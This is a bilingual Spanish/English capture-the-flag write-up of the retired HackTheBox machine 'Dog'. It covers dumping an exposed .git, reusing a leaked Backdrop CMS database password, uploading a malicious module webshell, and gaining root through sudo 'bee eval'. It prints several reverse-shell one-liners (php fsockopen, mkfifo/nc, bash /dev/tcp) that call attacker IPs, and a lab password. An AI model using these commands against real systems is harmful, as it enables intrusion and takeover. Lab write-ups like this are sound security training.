# Dog [Easy]

> **ES:** Máquina Linux fácil: un Backdrop CMS con `.git` expuesto filtra credenciales, un módulo malicioso da shell y `bee` con `sudo` permite ser root.
> **EN:** Easy Linux machine: a Backdrop CMS with exposed `.git` leaks credentials, a malicious module gives shell, and `bee` with `sudo` allows root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Dog] |
| **URL** | https://app.hackthebox.com/machines/Dog |
| **IP lab** | 10.10.11.58 |
| **Fecha de resolución** | 2025-03-04 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía `.git` expuesto → RCE autenticado con módulo (tar) → reuse a `johncusack` → `bee eval` con `sudo`.
> **EN:** Get `user.txt` and `root.txt` via exposed `.git` → authenticated RCE with module (tar) → reuse to `johncusack` → `bee eval` with `sudo`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap / fscan
- [ ] dvcs-ripper (`rip-git.pl`) / git-dumper (dump de `.git`)
- [ ] git + BackDropScan (enumeración de usuarios)
- [ ] PoC módulo malicioso (EDB 52021) empaquetado en tar
- [ ] mysql (enumeración de `users`)
- [ ] ssh / su

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** SSH y Apache con Backdrop CMS. nmap ya avisa de `/.git/` expuesto y lista `robots.txt` con rutas del CMS (`/user/login`, `/?q=admin`, …).
> **EN:** SSH and Apache with Backdrop CMS. nmap already flags exposed `/.git/` and lists `robots.txt` with CMS routes (`/user/login`, `/?q=admin`, …).

```bash
nmap -sC -sV -oN nmap_init 10.10.11.58
curl -s http://10.10.11.58/robots.txt
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41, `Backdrop CMS 1`. Repositorio git accesible en `/.git/` (último commit "todo: customize url aliases"). Captura de la home en `img/image_20250353-085334.png`; captura legacy en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Se vuelca el `.git` (dvcs-ripper o `git-dumper`) y en el historial aparecen el correo `tiffany@dog.htb` (`files/config_*/active/update.settings.json`; también vía BackDropScan) y la cadena de conexión MySQL en `settings.php` con contraseña reutilizable (credencial de laboratorio retirado).
> **EN:** Dump `.git` (dvcs-ripper or `git-dumper`); history reveals `tiffany@dog.htb` (`files/config_*/active/update.settings.json`; also via BackDropScan) and the MySQL connection string in `settings.php` with a reusable password (retired-lab credential).

```bash
perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/
# alternativa: git-dumper http://10.10.11.58:80/.git/ ./git-repo-dump
grep -r "tiffany@dog.htb" files/ 2>/dev/null | head
grep -n "mysql://" settings.php
# $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

**Resultado / Result:** Usuario `tiffany@dog.htb` + contraseña de la DB que también sirve en el login web (`/?q=user/login`). Versión confirmada en `/?q=admin/reports/status`: Backdrop CMS 1.27.1. Capturas del dump y del login en `img/` (`img/image_20250304-150416.png`, `img/image_20250308-150804.png`, `img/image_20250308-150816.png`).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Logueado en Backdrop, se instala manualmente un módulo malicioso empaquetado en **tar** (no zip; el CMS no acepta zip) con webshell (idea del EDB 52021) vía `/?q=admin/modules/install` ("Manual Installation") y se visita `/modules/shell/shell.php`.
> **EN:** Logged into Backdrop, manually install a malicious module packed as **tar** (not zip; the CMS rejects zip) with a webshell (EDB 52021 idea) via `/?q=admin/modules/install` ("Manual Installation") and visit `/modules/shell/shell.php`.

```bash
python3 test-01.py http://10.10.11.58  # genera shell.zip (idea EDB 52021)
tar czf shell.tar shell
# subir en /?q=admin/modules/install (Manual Installation)
curl -s http://10.10.11.58/modules/shell/shell.php
# en la webshell:
php -r '$sock=fsockopen("10.10.16.31",9999);exec("bash <&3 >&3 2>&3");'
# alternativa: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 443 >/tmp/f
nc -lvnp 9999
```

**Resultado / Result:** Ejecución como `www-data` → reverse shell (`www-data@dog:/var/www/html/modules/shell$`). Capturas de la instalación y la webshell en `img/` (`img/image_20250316-151652.png`, `img/image_20250318-151813.png`, `img/image_20250318-151847.png`).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Hay dos usuarios locales (`jobert`, `johncusack`); la contraseña de la DB se reutiliza con `su johncusack` y su home tiene `user.txt`. La tabla `users` de MySQL confirma los correos (`tiffany`, `jobert`, …) aunque sus hashes `$S$E…` (Backdrop/Drupal) no se crackean: basta el reuse.
> **EN:** Two local users exist (`jobert`, `johncusack`); the DB password is reused with `su johncusack`, whose home holds `user.txt`. The MySQL `users` table confirms the emails (`tiffany`, `jobert`, …) though their `$S$E…` (Backdrop/Drupal) hashes are not cracked: reuse suffices.

```bash
ls -lh /home/  # jobert, johncusack
su johncusack  # BackDropJ2024DS2024 (reuse)
cat /home/johncusack/user.txt  # formato: e7ea... (ofuscado)
```

**Resultado / Result:** Sesión como `johncusack` (password reuse) → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `johncusack` corre `/usr/local/bin/bee` (enlace a `/backdrop_tool/bee/bee.php`, CLI de Backdrop) con `sudo` sin contraseña. Su subcomando `eval` ejecuta PHP arbitrario como root (también sirve para reverse shell directa).
> **EN:** `johncusack` runs `/usr/local/bin/bee` (symlink to `/backdrop_tool/bee/bee.php`, the Backdrop CLI) with passwordless `sudo`. Its `eval` subcommand runs arbitrary PHP as root (also usable for a direct reverse shell).

```bash
sudo -l  # (ALL : ALL) /usr/local/bin/bee
file /usr/local/bin/bee  # symbolic link to /backdrop_tool/bee/bee.php
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami');"  # root
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"  # formato: 3fe5... (ofuscado)
# alternativa reverse shell:
sudo /usr/local/bin/bee --root /var/www/html eval "echo shell_exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.3/443 0>&1\"');"
```

**Resultado / Result:** Ejecución como `root` vía `bee eval`. Técnica: abuso de CLI del CMS con `sudo` (eval → RCE).

---

## 🧠 Lo aprendido / Learned

> **ES:** Un `.git` público equivale a código fuente + secretos; tras RCE, probar cada secreto en `su`/SSH; los `sudo` a CLIs con `eval` son root directo.
> **EN:** A public `.git` equals source + secrets; after RCE, try every secret on `su`/SSH; `sudo` on CLIs with `eval` is direct root.

- [ ] Exfiltración de `.git` expuesto (dvcs-ripper / git-dumper)
- [ ] Secretos en `settings.php` y password reuse
- [ ] RCE autenticado en Backdrop CMS vía módulo tar
- [ ] Privesc con `bee eval` bajo `sudo`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: `git-dumper`, BackDropScan, tabla `users` MySQL, webshell `mkfifo/nc`) — wither/nota migrada
- **Referencia técnica:** Backdrop CMS 1.27.1 Authenticated RCE — https://www.exploit-db.com/exploits/52021 — Exploit-DB
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
